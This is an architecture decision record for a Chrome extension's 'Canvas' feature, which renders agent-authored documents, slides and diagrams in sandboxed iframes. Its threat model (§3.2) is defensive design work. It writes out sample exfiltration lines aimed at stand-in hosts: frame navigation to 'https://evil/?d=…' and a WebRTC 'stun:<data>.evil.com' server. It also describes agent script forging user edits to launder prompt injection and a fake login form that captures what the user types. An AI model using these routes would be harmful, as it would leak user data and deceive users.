# ADR: Canvas — agent-rendered documents, slides and diagrams beside the chat

- **Status:** Proposed 2026-10-10
- **Date:** 2026-10-10
- **Author:** Brett Chien (drafted by Orca)
- **Related:** [chat markdown rendering](./chat-markdown-rendering.md) (§3.1 vendoring, §3.6 diagram
  engine, §3.7 CSP); `katashiro.show_image` (#59); reply-to (#61); multi-conversation (ADR pending).

> Citations are inline as `[Key]` at the point of the claim; each key resolves in **References**.

---

## 1. Context

### 1.1 Problem — the chat bubble is the only output surface

An agent can only answer with text in a chat bubble (rendered markdown) or a static bitmap
(`show_image`). This does not fit several kinds of output Brett asks for:

- **Long documents** (an ADR draft, a report). They are narrow in the side panel, scroll away, and
  every revision is re-sent in full as a new bubble, so you cannot see "the current version".
- **Slides.** There is no presentation surface at all.
- **Charts and diagrams.** The agent container has no browser. `mmdc` fails without
  chrome-headless-shell, so today a diagram means hand-written SVG pushed through `show_image`.
- **Iteration.** You cannot edit what the agent produced, and the agent cannot see your edits.

What we want is close to Claude's artifacts and ChatGPT's canvas `[Artifacts]` `[Canvas]`: a persistent,
versioned surface next to the conversation that the agent renders into and updates live.

### 1.2 Constraints

- **The panel holds the tokens.** The side panel's `chrome.storage` holds ACP keys and the Jev token.
  The markdown ADR's threat model `[MD-ADR §1.2]` applies with more force here: canvas content is
  agent-authored and may echo a web page the agent read. **Agent-authored HTML or JS must never run
  in an extension-page origin** (the panel, or any page that can reach `chrome.*`).
- **MV3 CSP.** Extension pages run under `script-src 'self'`, and `'unsafe-eval'` cannot be granted
  `[MV3-CSP]`. That is why the markdown ADR leaned towards dagre over mermaid `[MD-ADR §3.6]`.
  **Sandboxed pages** declared in `manifest.sandbox.pages` get a unique opaque origin, have no
  `chrome.*` extension APIs, and have their own `content_security_policy.sandbox` `[MV3-Sandbox]`.
  This is the escape hatch: rich and even scripted content runs there, cut off from the tokens.
- **Transport.** Agent → Katashiro is the MCP-over-ACP tunnel (tool calls), the same path
  `show_image` uses (≤ 5 MB decoded). The agent sends content as tool arguments, so bytes go into
  the model's context unless a shell helper posts them to the facade (the `show_image` skill pattern).
- **No build system.** Libraries are vendored as prebuilt bundles and pinned exactly
  (`vendor/BUILD.md`, `scripts/vendor-build/`).

---

## 2. Research — prior art and libraries (checked 2026-10-10)

- **Claude artifacts / ChatGPT canvas** `[Artifacts]` `[Canvas]`: content lives beside the chat,
  untrusted code runs in an isolated frame, and revisions are versions of one object rather than
  new messages. ChatGPT canvas lets the user edit, and the model then edits on top of those edits.
- **reveal.js 6.0.2** (MIT) `[Reveal6]`: 6.0 (2026-03) moved plugins to `dist/plugin/<name>.js`,
  renamed `.esm.js` to `.mjs`, and ships TS types plus an official `@revealjs/react`. The markdown
  plugin uses `---` as the slide separator. There is a new `sync` event and `removeHiddenSlides()`,
  which suit live re-render. Export is **PDF only**, via `?print-pdf` and the browser print dialog.
  There is no pptx import or export.
- **Mermaid 12.1.0** `[Mermaid12]`: ELK is now the default layout, and it needs ES2024 (fine in
  Chrome). The full package is 116 MB unpacked; **`@mermaid-js/tiny` is a 2.7 MB single file**.
- **Chart.js 4.5.1** (203 KB UMD), **uPlot 1.6.32** (~50 KB, time series).
- **pptx:** `pptxgenjs` 4.0.1 (MIT, 450 KB) writes pptx in the browser from a slide model.
  `pptxtojson` 2.2.0 (MIT) parses pptx into JSON. `dom-to-pptx` 2.1.2 converts rendered HTML into
  editable pptx (untested).
- **Editors:** `@milkdown/crepe` 7.22.2 (MIT, ProseMirror, markdown-native WYSIWYG) and CodeMirror 6.
  **Brett chose Milkdown over Quill (2026-10-10).** Quill 2.0.3 (BSD-3, 204 KB, last release 2025-01)
  stores a Delta/HTML model, so every agent ↔ user round trip through markdown loses something: it has
  no default horizontal-rule format (`---` slide breaks), drops code-fence languages, and converts
  tables unreliably. Measured crepe bundle (esbuild IIFE, CSS excluded): **2.7 MB minified, 906 KB
  gzip**, 0 `eval`, 0 `new Function`, and 2 `Function(`: a `Function("return this")` global
  fallback, and a `Function("", "var x …")` syntax probe inside `try`, which the sandbox CSP blocks
  and the `try` absorbs. The smoke test below covers it.
- **eval scan (static grep of the dist files):** reveal.js has 0 `eval` and 0 `Function(`. Chart.js
  has none (only identifiers named `…Function(`). `mermaid.tiny.js` has 0 `eval` and 4
  `Function("return this")()` global-object fallbacks that sit behind `self` checks. pptxgenjs has
  core-js polyfill fallbacks. The grep is not a safety control: the sandbox CSP has no
  `'unsafe-eval'`, so any eval is blocked regardless. The real risk is **functional**: a library
  whose fallback throws, or mermaid 12's default ELK layout trying to start a Worker (blocked by
  `worker-src 'none'`). So each engine gets a **smoke test that renders a fixture inside the real
  sandbox CSP and fails on any `securitypolicyviolation` not on a per-engine allow-list**. An entry
  matches on `violatedDirective` + `sourceFile` + `sample`; the initial entries are the known,
  absorbed probes (crepe's `Function("", …)` syntax probe, and the `Function("return this")`
  global fallbacks in crepe and mermaid-tiny, if they fire). A new or changed violation fails the
  test until someone reviews it. For mermaid, check whether `@mermaid-js/tiny` bundles ELK and
  whether it runs without a Worker.

---

## 3. Decision

### 3.1 Surface — one Chrome tab per canvas, grouped (decided by Brett, 2026-10-10)

Each canvas opens in **its own extension tab** (`canvas.html?id=<canvasId>`), never inside the panel:

- The panel is ~400 px wide. Slides and documents need the full tab width.
- **One Chrome tab per canvas, gathered in a native tab group per conversation** (title = the
  conversation title, or "Canvas" until multi-conversation lands; fixed color), in the panel's
  window. Canvases stay together and out of the user's page tabs; the group collapses to one chip.
  This needs no tab UI of our own: drag, pin, close and Split View are Chrome's.
- The chat gets a **card** in the agent's turn, `📄 <title> · v<N> — Open`. Clicking it focuses that
  canvas's tab, or reopens it in the group if it was closed. A tab shows one canvas, with a version
  picker. A new canvas from the agent opens a new tab in the group without stealing focus.
- **Split View beside a web page.** Katashiro's `split_tabs` requires both tabs to share window,
  pinned state and tab group (it checks this before `tabs.createSplit`, following Chrome's split
  rule; Chrome's own rejection has not been tested live). So "canvas beside this page" temporarily
  moves the canvas tab **out of its group** (into the page's group, if any), splits, and moves it
  back when the split ends or the page closes. Two canvases split directly, being in the same group.
  Agent form: `canvas_open(…, beside: "current")`.
- If the user drags a canvas tab out of the group or deletes the group, Katashiro does not fight
  it: the next `canvas_open` in that conversation recreates the group, and stray canvas tabs are
  found again by URL.
- With multi-conversation, switching conversation collapses the old conversation's group and
  expands the new one's.
- The panel never renders canvas content itself.

**Implementation rules for tab and group moves** (Chrome tab APIs are async and the MV3 service
worker can be suspended at any point):
- **One queue per conversation.** Every group operation (create the group, add a tab, split
  in/out) runs in a per-conversation queue, and the `groupId` lives in `storage.session`. Two quick
  `canvas_open` calls therefore create one group, not two.
- **No in-memory state across events.** Tab/group listeners are registered at the top level of
  the service worker. Before a split move, the canvas tab's original group and index are saved to
  `storage.session`. Whether Chrome emits a reliable "split ended" signal (e.g. a split field in
  `tabs.onUpdated`) must be tested; if not, the move back happens lazily on the next `canvas_open`
  or when the tab is focused.
- **Move back only if nothing changed.** The tab is returned to its group only if it is still where
  Katashiro put it and the original group still exists. If the user dragged it elsewhere, closed
  the group, or moved it to another window, it stays put, and the next `canvas_open` sorts it out.
- **Re-check after every await.** A move sequence (ungroup → split) re-reads tab state after each
  step; if a tab or group has gone (the user closed the page mid-move), it rolls back to the
  previous state instead of assuming the last step succeeded.
- **Duplicate tabs of one canvas** (the user duplicated the tab): both editors save with their
  `baseVersion`, so the later save gets the conflict view (§3.5). The card focuses the most
  recently used tab of that canvas.
- **Collapsing on conversation switch:** activate a tab outside the old group first (the new
  group's tab, or the web page), then collapse; Chrome will not collapse a group holding the
  active tab.

### 3.2 Isolation — host page plus sandboxed frames

```
canvas.html  (extension page — trusted chrome: title, versions, banner, export; NEVER agent HTML)
  ├─ <iframe src="canvas-frame.html#<nonce>">       (sandbox page: our engines + editors, no agent script)
  │     renders markdown / slides / image / chart / mermaid; hosts the phase 2 editors
  └─ <iframe src="canvas-html-frame.html#<nonce>">  (sandbox page, phase 2: agent HTML + inline script)
        renders one `html` canvas; view-only, never sees edits or other canvases
```

Both are `manifest.sandbox.pages`: opaque origin, no `chrome.*` `[MV3-Sandbox]`.

**What the sandbox does and does not stop.** `connect-src 'none'`, `img-src data: blob:`,
`form-action 'none'`, no `allow-popups` and no `allow-top-navigation` close fetch, image beacons,
form posts, `window.open` and navigating the top page. CSS `url()` falls under `img-src`/`font-src`
and `@import` under `style-src 'self'`, so they are closed too. `blob:` cannot be navigated to, and
downloads need `allow-downloads`. **They do not stop the frame from navigating itself**
(`location = "https://evil/?d=…"`): removing `allow-top-navigation` only protects the top page, and
the CSP `navigate-to` directive never shipped. A clicked link in rendered markdown does the same.
After such a navigation the attacker page is the same WindowProxy, so `event.source` still matches,
and a sandboxed origin is `"null"` either way, so `event.origin` cannot tell them apart. Everything
below is built around that.

- **Load gate.** The host listens for the iframe's `load` event and counts the loads it caused
  itself (the initial `src`, and the print reload in §3.8). **Any other load means the frame
  navigated away:** the host removes the iframe, shows a warning, and sends nothing more. Without
  this, the next `render` (posted with `'*'`, the only option for an opaque origin) would go to the
  attacker page. Counting alone can misattribute a load if the frame navigates itself around a
  host-caused reload, so **every host-caused load gets a fresh nonce**, and the host sends `render`
  only after a `ready` carrying that new nonce.
- **No navigation by links.** A capture-phase listener on the frame's `document` handles `click`
  and `auxclick` (middle click), finds `event.target.closest('a, area')` (this covers SVG `<a>` from
  mermaid or sanitized SVG), calls `preventDefault`, and sends `openLink{url}` instead. The host
  accepts only `http:`/`https:`, shows the full URL, and opens it in a new tab after the user
  confirms. `target` attributes are stripped by DOMPurify. Mermaid runs with
  `securityLevel: 'strict'`, so its `click` directive is disabled.
- **Nonce.** The host generates a random nonce per load and puts it in the `src` fragment. The
  frame reads it once and includes it in every message; the host drops messages without it. This
  holds in `canvas-frame.html`, which runs no agent script. In `canvas-html-frame.html` agent script
  can read the hash, so there it is only a second check behind the load gate.
- **Messages before the gate fires.** After a navigation, the new document's script runs before the
  iframe's `load` event, so an attacker page can post first. That is why the allow-lists below stay
  harmless on their own, and why the host renders `error{msg}` only with `textContent`, capped at
  500 characters.
- **Host → frame:** `postMessage({type:"render", nonce, kind, content, version})`. The frame never
  fetches anything; everything it shows arrives in this message.
- **Frame → host — per-frame allow-lists.** The host checks `event.source` against that frame's
  `contentWindow`, the nonce, the type and fields, caps sizes, and treats the payload only as data.
  - `canvas-frame.html`: `ready`, `rendered{version, normalized?}` (§3.5), `error{msg}`, `openLink{url}`,
    `save{content, baseVersion}` (phase 1, markdown editing; slides from phase 2), and in phase 2
    `selection{text}`.
  - `canvas-html-frame.html`: `ready`, `rendered{version}`, `error{msg}` only. **`save` and
    `selection` are refused**, so agent script cannot forge a "user" edit. Otherwise a forged
    `save` would be stored as `author:"user"` and read back by the agent as user intent: prompt
    injection laundered into the user's voice.
- **Not web-accessible.** `canvas.html`, `canvas-frame.html` and `canvas-html-frame.html` must never
  be listed in `web_accessible_resources`. Otherwise any web page could frame or open
  `canvas.html?id=…`, which adds a clickjacking surface and an entry point for guessing ids.
- **Titles** come from the agent. The host renders them with `textContent` only, capped at 120
  characters.
- **CSP, in two layers.** `content_security_policy.sandbox` is **one policy for every sandbox
  page**, so it is the loosest any frame needs:
  ```
  sandbox allow-scripts allow-modals; default-src 'none'; script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline'; img-src data: blob:; font-src 'self' data:;
  connect-src 'none'; frame-src 'none'; worker-src 'none'; form-action 'none'; base-uri 'none'
  ```
  (`'unsafe-inline'` in `script-src` only from phase 2, when `canvas-html-frame.html` exists.)
  Each page then tightens itself; a second policy can only add restrictions:
  - `canvas-frame.html` carries `<meta http-equiv="Content-Security-Policy" content="script-src
    'self'">`, so a DOMPurify bypass in markdown still cannot run script.
  - The host sets the iframe `sandbox` attribute per frame (flags from the attribute and the CSP
    both apply): `allow-scripts allow-modals` for `canvas-frame.html` (modals are needed to print,
    §3.8, and no agent script runs there), and plain `allow-scripts` for `canvas-html-frame.html`.
  Chrome documents that a custom sandbox CSP must keep `sandbox` with `allow-scripts`. Its default
  is `sandbox allow-scripts allow-forms allow-popups allow-modals; script-src 'self' 'unsafe-inline'
  'unsafe-eval'; child-src 'self'` `[MV3-Sandbox]`, so ours is a strict tightening. To verify during
  implementation: Chrome loads the extension with it, and the meta CSP is enforced in the frame.
- **CSP violations are reported.** Each frame listens for `securitypolicyviolation` and sends it as
  `error{}`, so a library that hits a blocked eval or Worker fails visibly, not silently.

**Residual risk.**
- `canvas-frame.html` (all of phase 1): no agent script runs, links go through `openLink`, and the
  load gate catches anything else. **Content has no way out except the allow-listed messages.**
- `canvas-html-frame.html` (`html` kind, phase 2): **content can leave, and the ADR says so.** Agent
  script can navigate the frame with data in the URL (the load gate notices only afterwards), and
  can exfiltrate through WebRTC (`RTCPeerConnection` with a `stun:<data>.evil.com` ICE server
  reaches DNS/UDP; Chrome does not implement the CSP `webrtc` directive, and `connect-src` does not
  cover it). `<link rel=dns-prefetch>` has historically bypassed CSP; test it during
  implementation. What limits the damage: the frame only ever receives its own canvas content,
  never edits, other canvases or anything from the panel. A fake login form there **can** send what
  the user types. The host therefore shows a permanent banner on every canvas, *"Agent-generated
  content — Katashiro never asks for passwords or keys here"*, and the `html` kind sits behind a
  setting that is off by default (§6 Q2).

### 3.3 Content kinds, in phases

| Phase | `kind` | Engine (vendored, exact pin) | Notes |
|---|---|---|---|
| 1 | `markdown` | existing markdown-it + DOMPurify + hljs | same sink as the chat, full width |
| 1 | `slides` | reveal.js 6.0.2, fed by markdown-it + DOMPurify | `---` between slides; PDF via print |
| 1 | `image` | existing `show_image` decode path | `imageId` (screenshot) or `data` |
| 2 | `chart` | Chart.js 4.5.1 | JSON config only; no JS callbacks |
| 2 | `html` | none (agent HTML + inline JS) | own frame (§3.2); setting, off by default |
| 3 | `mermaid` | `@mermaid-js/tiny` 12.1.0 | also renders ```` ```mermaid ```` fences in `markdown` |

- Phase 1 runs **no agent-authored script**. Every engine is our own vendored code.
- **Markdown canvases are editable from phase 1** (Milkdown crepe, §3.5). Slides get the
  CodeMirror 6 source + live preview editor in phase 2.
- **Slides are sanitized like markdown.** reveal's markdown plugin parses with marked, which passes
  raw HTML through, and its `<!-- .element: … -->` comments set attributes. We do not use it.
  Instead we split on `---`, render each slide with markdown-it + DOMPurify (the chat's sink), and
  hand reveal finished `<section>` elements. Per-slide attributes, if ever needed, come from a small
  allow-list we parse ourselves.
- Phase 2's `html` kind is the first to run agent script, only in `canvas-html-frame.html` (§3.2).
  Still no fetch and no eval, but not leak-proof (§3.2 residual risk).
- **Mermaid supersedes the markdown ADR's dagre lean** `[MD-ADR §3.6]`. That lean existed because
  mermaid could not run on an extension page, and in the sandbox it can. Chat bubbles keep showing
  mermaid fences as code; the canvas renders them.
- React/Babel: not planned. Babel needs eval, and `html` + Preact (`htm`, no build step) covers
  the cases.

### 3.4 Agent tools

| Tool | Does |
|---|---|
| `katashiro.canvas_open({title, kind, content \| imageId \| data, id?, baseVersion?})` | Without `id`: creates a canvas and returns `{id, version: 1}`. With `id`: a new version, re-rendered live; **`baseVersion` is then required** (no blind writes). |
| `katashiro.canvas_read({id, version?})` | Returns content plus version history (author, time), including **user edits** |
| `katashiro.canvas_list()` | Lists the conversation's canvases: id, title, kind, latest version, last author |
| `katashiro.canvas_patch({id, baseVersion, edits:[{find, replace}]})` | Phase 2: patches a long document without resending it |

- Caps: 2 MB text per version, 5 MB images (as `show_image`). Writes are rate-limited like `notify`.
- Large payloads use a shell helper that posts to the facade (the `show_image` skill pattern), so
  the content does not pass through model output twice.
- Not gated by act mode: like `show_image`, it changes nothing on any web page.

### 3.5 Versions and concurrency (markdown editing in phase 1, slides in phase 2)

- Each save is a version `{n, author: "agent" | "user", at, content}`.
- **Optimistic concurrency, agent side.** An agent update carries `baseVersion` (required with
  `id`). If the canvas has moved on (the user edited it), the call is **rejected** with a
  structured error, not the whole document:
  `{error: "stale", currentVersion, author, diffFromBase}`. `currentVersion` is the latest version
  number, and `diffFromBase` is a unified diff from `baseVersion` to it. The agent can rebase on the
  diff without re-reading up to 2 MB. If `baseVersion` has been evicted (§3.6), `diffFromBase` is
  `null` and the agent calls `canvas_read`. A user's edit is never silently overwritten.
- **`canvas_patch` rebases itself.** All `find`s are matched against **one snapshot of the latest
  version**, not `baseVersion` and not each other's output. Each must match exactly once, and the
  matched ranges must not overlap. Then all replacements apply together; otherwise none do and the
  call is rejected (with the error above), so one `replace` can never create a match for the next.
  On success after the canvas has moved on, the result carries `rebasedOver: {version, author}` so
  the agent knows the user edited in between. The common case, "the user edited section A, the
  agent patches section B", does not conflict.
- **User side: unsaved edits are never eaten.** If the user has unsaved changes when an agent
  version arrives, the frame does not re-render. The host stores the agent's version and shows
  *"Agent saved vN — view / keep editing"*. When the user then saves, their `save{baseVersion}` is
  stale, and the host opens a conflict view (their text beside the latest version) where they
  choose: keep mine as a new version on top, or discard mine. If the editor is clean, the new
  version renders directly.
- User edits reach the agent through `canvas_read`. Open question 4: should the next prompt also get
  a one-line note such as `[canvas "X" edited by user: v5 → v6]`? If so, metadata only, never the
  content.
- Editors: **Milkdown crepe for `markdown` (phase 1)**, and CodeMirror 6 source + live preview for
  `slides` (phase 2). **Both run inside `canvas-frame.html`, never in the `html` frame.** The host
  receives only the saved markdown string via `save{}`. Milkdown's markdown is the stored format,
  so agent and user edit the same text with no conversion step. Saved markdown is rendered through
  the same markdown-it + DOMPurify sink as agent markdown; the editor's own DOM is never persisted.
- **Milkdown normalizes markdown, and the stored text is the normalized text.** Parsing and
  serializing rewrites formatting (`*` → `-`, escaping, blank lines, table alignment). Left alone,
  a one-character user edit would save as a fully reformatted document, so the agent's `find`s
  (written against its own original text) would miss and `diffFromBase` would cover everything.
  So:
  - **Agent writes are normalized on render — `markdown` kind only** (`slides`, `chart` and the
    others are stored as sent). The frame normalizes with Milkdown's parser + serializer alone, no
    editor view, so it does not depend on how the canvas is displayed. After rendering an agent
    `markdown` version, the frame sends `rendered{version, normalized}`. The host accepts
    `normalized` only from `canvas-frame.html` with the current nonce, only for the `version` it is
    waiting on, and only up to 2 MB (as `save`); anything else is ignored. If two tabs of the same
    canvas both answer, the first wins (normalization is idempotent, so they agree). The host replaces that version's stored content with
    `normalized` (same `n`, still `author:"agent"`), and `canvas_read` and `diffFromBase` use it.
    The tool result waits for this (with a timeout) and carries `normalizedDiff` when the text
    changed, so the agent's next `find` targets what is actually stored. If no frame renders in
    time (tab closed), the version is stored raw with `normalized:false` and normalized in place
    on the next open; a `canvas_patch` whose `find` then misses gets the `stale` error with a diff.
  - Normalization must be **idempotent** (serializing its own output changes nothing); the
    Milkdown smoke test asserts it.
- **Only an explicit user save creates a user version.** `save{}` is sent on Ctrl+S or the Save
  button, never on editor change events (an autosave, if added, counts only `isTrusted` input).
  "Dirty" is measured against the **normalized** text loaded into the editor, not the agent's
  original, and a save whose text equals the current version creates no version. Loading or
  re-rendering agent content therefore never produces an `author:"user"` version, never makes the
  next agent write `stale`, and never triggers the §6 Q4 edit note.
- **View and edit are separate modes.** A `markdown` canvas is displayed read-only through
  markdown-it + DOMPurify (the chat's sink). Milkdown is mounted only when the user clicks Edit, and
  unmounted on leaving edit mode, so the unsanitized path below exists only while the user edits.
- **Editing is a second render path.** Milkdown parses agent markdown straight into ProseMirror DOM
  without DOMPurify; the "same sink" above covers only saved text. What holds it is
  `canvas-frame.html`'s CSP (`script-src 'self'`, `img-src data: blob:`, `connect-src 'none'`) plus
  link interception. In addition: Milkdown's `html` node renders as plain text, never `innerHTML`;
  crepe features we do not use are disabled (image-by-URL input, remote image loading, uploads);
  and CodeMirror language packages are vendored, never loaded dynamically.

### 3.6 Storage and ownership

- `chrome.storage.local` with the `unlimitedStorage` permission. **One key per version**, so a save
  writes only the new version, not the whole history:
  - `canvas:<conversationId>:index` — the conversation's canvases with title, kind, latest version
    and byte size.
  - `canvas:<id>:meta` — title, kind, `conversationId`, version list (`n`, author, time, bytes).
  - `canvas:<id>:v<n>` — one version's content.
- **The cap is a byte budget, not a count.** "50 canvases × 20 versions × 2 MB" would allow 2 GB.
  The budget is 200 MB total (a setting). Over budget, the host drops the oldest versions first
  (each canvas keeps its first and latest), then whole canvases, least recently opened first.
- **Keyed by `conversationId` from day one** (already minted by #61), so multi-conversation needs no
  migration. Until it lands, the window's conversation owns its canvases.
- **Incognito** uses `storage.session`, mirroring the chat history (#54). Its ~10 MB quota is
  **shared with that chat history**, so the canvas budget is the quota minus what the history
  already uses (`getBytesInUse`), with the same eviction. If the new version alone does not fit,
  the tool call fails with `{error: "quota"}` and the card says so; nothing is half-written.
- If `chrome.storage.local` becomes slow at this size, move version bodies to IndexedDB on the
  extension origin (the host page owns the reads and writes either way).

### 3.7 Chat integration

- The card sits in the agent's turn. Clicking it opens the canvas at the version that turn created.
- **Reply-to** (#61) may quote a canvas version, rendering `↩ 📄 title v3`.
- `chat_history` records `[canvas "title" v3]` placeholders, not the content (as with images).

### 3.8 Export and import

- **PDF** (phase 1), through the browser print dialog. A sandboxed frame without `allow-modals`
  cannot call `print()` (the HTML spec's sandboxed modals flag blocks it), which is why
  `canvas-frame.html` gets `allow-modals` (§3.2). Export sends `print` to the frame; for slides the
  host first reloads the frame with reveal's `?print-pdf` (a host-caused load, so the load gate
  allows it), then the frame calls `print()`. `alert`/`confirm` are opened too, but nothing in that
  frame is agent script. The `html` frame has no print. To verify during implementation: the
  dialog prints the full deck. Fallback: print from `canvas.html` with the iframe sized to content.
  The print reload would discard unsaved editor content, so **export is disabled while the editor
  is dirty**, with a "Save first" prompt.
- **pptx export** (phase 2–3): `pptxgenjs` from **our slide model** (titles, bullets, images,
  code as monospace). The result is editable in PowerPoint but **not pixel-faithful**: reveal CSS
  and themes, fragments and transitions are lost. `dom-to-pptx` is the higher-fidelity candidate,
  to evaluate then.
- **pptx import** (phase 3+, not committed): `pptxtojson` → markdown slides, keeping titles, text and
  images. **Layout will not survive.** It is positioned as "bring the content in", not "round-trip".

---

## Consequences

### Positive
- Long and structured output gets a full-width, persistent, versioned home, and the chat stays short.
- Diagrams and charts render in Brett's Chrome. The agent container needs no browser.
- Agent-authored script is possible (phase 2) without touching the token-holding origin.
- One model (versioned canvas plus card) serves documents, slides, charts and diagrams.

### Negative / tradeoffs
- Vendor weight: Milkdown crepe 2.7 MB minified (phase 1), reveal.js ~120 KB + CSS/themes, Chart.js
  ~200 KB, mermaid-tiny 2.7 MB (phase 3). The release zip grows by roughly 6 MB at full scope.
- More Chrome tabs than an in-page tab strip would need (one per open canvas, each loading its own
  sandbox frame), and group bookkeeping around Split View (§3.1).
- A second rendering path (sandbox) beside the panel's markdown sink, with its own security review.
- The sandbox does not stop a frame from navigating itself. That takes a load gate, link
  interception and per-frame message allow-lists (§3.2), and the `html` kind still cannot be made
  leak-proof.
- Version storage can grow quickly for big slide decks. Caps are needed, and old versions are lost.
- pptx in either direction is lossy and must be described honestly in the UI.

### Neutral
- No openab changes: tools ride the existing MCP-over-ACP tunnel.
- The markdown ADR §3.6 dagre lean is superseded for the canvas. The chat is unchanged.

---

## 4. Alternatives considered

- **Render in the side panel.** Too narrow, and agent HTML would sit next to the tokens. Rejected.
- **Host the canvas on a remote origin** (artifacts-style separate domain, e.g. S3/CloudFront).
  That needs infra, network egress and auth, and the content leaves the machine. Rejected; the MV3
  sandbox gives the same isolation offline.
- **`data:` URL in a new tab.** Chrome restricts top-level `data:` navigation, a `data:` page has no
  channel back for versions/edits, and its CSP is not ours to set. Rejected.
- **Offscreen document.** Not visible, and it has `chrome.*` access. Wrong tool.
- **Render on the server and send images** (mmdc, headless Chrome in the agent). Heavy (a browser in
  every agent container, and not covered by state backup), static, and not editable. Kept only as
  `show_image` for one-off pictures.
- **Quill for editing.** It loses markdown structure on a round trip (§2). Rejected for Milkdown and
  CodeMirror (Brett, 2026-10-10).
- **One canvas tab with its own internal tab strip.** Keeps Chrome's tab bar to one tab per window and
  makes conversation switching a single swap. But it means building tab UI, and side-by-side
  comparison needs a "pop out" step. Rejected for native tabs + tab group (Brett, 2026-10-10).
- **Only one canvas at a time.** Simplest, but a document and a deck cannot coexist, and a new canvas
  overwrites the old one. Rejected.

## 5. Scope and non-goals

- **Phase 1 scope:** canvas tabs in a per-conversation tab group (with the Split View rule, §3.1),
  sandbox frame, `markdown`/`slides`/`image`, `canvas_open`/`canvas_read`/`canvas_list`, versions,
  card, PDF via print, and **Milkdown editing of `markdown` canvases** with the §3.5 concurrency.
- Non-goals: real-time multi-user collaboration; network access from canvas content; arbitrary npm
  packages at runtime; pixel-faithful pptx.

## 6. Open questions (for Brett)

Each has a recommendation from the review (Jellyfish, 2026-10-10), which this draft follows.

1. ~~**Surface:** a canvas tab, or a resizable drawer inside the panel?~~ **Decided (Brett,
   2026-10-10):** a tab per canvas, grouped per conversation (§3.1). Editor: Milkdown (§2, §3.5).
2. **`html` kind:** do we want agent-authored script at all (phase 2), or stop at
   markdown/slides/chart/mermaid?
   *Recommended: phase 2 stops at `chart` (and `mermaid` in phase 3). If `html` is built later, it
   ships only with §3.2 in full (own frame, refused `save`/`selection`, load gate, the stated
   WebRTC/navigation leak), behind a setting that is off by default.*
3. **Caps:** is a 200 MB byte budget right (§3.6)?
4. **Edit visibility:** auto-note user edits in the next prompt, or only via `canvas_read`?
   *Recommended: auto-note one metadata line (`v5→v6 by user`), never the content. This relies on
   the `html` frame being unable to send `save` (§3.2); otherwise a forged save would be noted too.*
5. **Order:** canvas phase 1 before multi-conversation (conversationId already exists), or after?
   *Recommended: phase 1 first, with storage keyed by `conversationId` from day one (§3.6).*

---

## References

- `[Artifacts]` Anthropic — What are artifacts and how do I use them? https://support.anthropic.com/en/articles/9487310-what-are-artifacts-and-how-do-i-use-them
- `[Canvas]` OpenAI — Introducing canvas. https://openai.com/index/introducing-canvas/
- `[MV3-CSP]` Chrome for Developers — Manifest: content_security_policy. https://developer.chrome.com/docs/extensions/reference/manifest/content-security-policy
- `[MV3-Sandbox]` Chrome for Developers — Manifest: sandbox. https://developer.chrome.com/docs/extensions/reference/manifest/sandbox
- `[MD-ADR]` [chat-markdown-rendering.md](./chat-markdown-rendering.md)
- `[Reveal6]` reveal.js 6.0.0 release notes. https://github.com/hakimel/reveal.js/releases/tag/6.0.0
- `[Mermaid12]` mermaid 12.0.0 release notes. https://github.com/mermaid-js/mermaid/releases
- pptxgenjs https://github.com/gitbrent/PptxGenJS · pptxtojson https://www.npmjs.com/package/pptxtojson ·
  Milkdown https://milkdown.dev · Chart.js https://www.chartjs.org
